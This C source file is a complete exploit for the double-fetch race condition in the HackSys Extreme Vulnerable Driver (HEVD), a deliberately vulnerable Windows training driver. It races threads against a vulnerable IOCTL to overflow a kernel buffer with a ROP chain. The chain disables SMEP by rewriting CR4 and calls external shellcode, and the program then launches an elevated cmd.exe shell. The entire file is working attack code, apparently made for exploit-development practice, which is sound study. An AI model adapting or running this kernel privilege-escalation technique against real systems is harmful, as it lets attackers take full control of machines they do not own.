#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <psapi.h>
#include <cstdint>
#include <time.h>

extern "C" void Shellcode(DWORD targetPID);

struct UserData {
    LPVOID pBuffer;
    size_t sizeOfData;
};

// global variables
UserData userData;
char* userBuffer;
HANDLE hDriver;

// used to stop the while loop
BOOL raceWon = FALSE;

void PrintTime(BOOL start)
{
    time_t rawtime;
    struct tm timeinfo;

    time(&rawtime); // Get current time

    localtime_s(&timeinfo, &rawtime);
 
    if (start)
    {

        printf("[+] Start time: %02d:%02d:%02d\n",
            timeinfo.tm_hour,
            timeinfo.tm_min,
            timeinfo.tm_sec);
    }
    else {
        printf("[+] End time: %02d:%02d:%02d\n",
            timeinfo.tm_hour,
            timeinfo.tm_min,
            timeinfo.tm_sec);
    }
}

// this is the function trying to win the race
DWORD WINAPI ChangeStruct(void* args)
{
    while (!raceWon)
    {
        userData.sizeOfData = 0x828;
        Sleep(10);
    }
    return NULL;
}

// this is the function sending the initial IOCTL
DWORD WINAPI SendIOCTL(void* args)
{
    userData.pBuffer = userBuffer;
    userData.sizeOfData = 0x800;
    BOOL status = DeviceIoControl(hDriver,
        0x222037, (LPVOID)&userData, sizeof(userData), NULL, 0, NULL, NULL);

    return NULL;
}

typedef uint64_t QWORD;
#define ARRAY_SIZE 1024
#define BUFFER_SIZE 0x810

QWORD getBaseAddr(LPCWSTR drvName) {
    LPVOID drivers[512];
    DWORD cbNeeded;
    int nDrivers, i = 0;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        WCHAR szDrivers[512];
        nDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < nDrivers; i++) {
            if (GetDeviceDriverBaseName(drivers[i], szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0]))) {
                if (wcscmp(szDrivers, drvName) == 0) {
                    return (QWORD)drivers[i];
                }
            }
        }
    }
    return 0;
}


int main() {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    printf("HEVD Double Fetch Exploit\n=========================\n");

    printf("[+] Number of CPU cores: %u\n", sysInfo.dwNumberOfProcessors);

    // get a handle to the driver
    hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("[!] Unable to get a handle for the driver: %d\n", GetLastError());
        return 1;
    }

    // allocate the user space buffer
    printf("[+] Allocating memory for user buffer...\n");
    userBuffer = (char*)malloc(sizeof(char*) * BUFFER_SIZE);
    memset((void*)userBuffer, 0x00, BUFFER_SIZE);
    printf("[+] userBuffer: 0x%p\n", userBuffer);

    // get the kernel base address
    QWORD kernelBase = getBaseAddr(L"ntoskrnl.exe");
    printf("[+] Kernel base address: 0x%p\n", kernelBase);

    QWORD hevdBase = getBaseAddr(L"HEVD.sys");
    printf("[+] HEVD base address: 0x%p\n", hevdBase);

    printf("[+] raceWin variable address: 0x%p\n", &raceWon);

    // useful ROP Gadgets
    QWORD ROP_NOP = kernelBase + 0x639131;                          // ret ;
    QWORD INT3 = kernelBase + 0x852b70;                             // int3; ret

    // marker
    QWORD marker = 0xdeadc0dedeadc0de;
    memcpy((void*)(userBuffer + 0x7f8), &marker, 0x8);

    // rop chain
    int index = 0;
    char* offset = userBuffer + 0x800;
    QWORD* rop = (QWORD*)offset;

    // SMEP bypass
    *(rop + index++) = (QWORD)&raceWon;                             // stored on stack (not in rop chain)
    *(rop + index++) = (QWORD)kernelBase + 0x7f700b;                // pop rcx
    *(rop + index++) = (QWORD)0x0070678;
    *(rop + index++) = (QWORD)kernelBase + 0x39e4a7;                // mov cr4, rcx; ret;
    *(rop + index++) = (QWORD)&Shellcode;

    printf("[!] Press enter to continue...");
    getchar();

    PrintTime(TRUE);
    printf("[+] Starting the race, this may take some time...\n");
    
    // this thread will try to win the race
    HANDLE tChangeStruct = CreateThread(NULL,
        NULL, ChangeStruct, NULL, CREATE_SUSPENDED, NULL);

    
    // make the thread critical and run on CPU0
    SetThreadPriority(tChangeStruct, THREAD_PRIORITY_TIME_CRITICAL);
    SetThreadAffinityMask(tChangeStruct, 0);
    ResumeThread(tChangeStruct);
    
    DWORD cpuIndex = 1;

    // this thread continuously calls the vulnerable hevd IOCTL
    while(!raceWon)
    {
        // make the thread critical and run on CPU0
        HANDLE tIOCTL = CreateThread(NULL,
            NULL, SendIOCTL, NULL, CREATE_SUSPENDED, NULL);
        SetThreadPriority(tIOCTL, THREAD_PRIORITY_TIME_CRITICAL);
        SetThreadAffinityMask(tIOCTL, cpuIndex);
        
        ResumeThread(tIOCTL);
        
        cpuIndex++;
        if (cpuIndex >= sysInfo.dwNumberOfProcessors)
            cpuIndex = 1;
    }

    PrintTime(FALSE);
    printf("[+] Enjoy your shell...\n\n");
    system("cmd.exe");

    return 0;
}
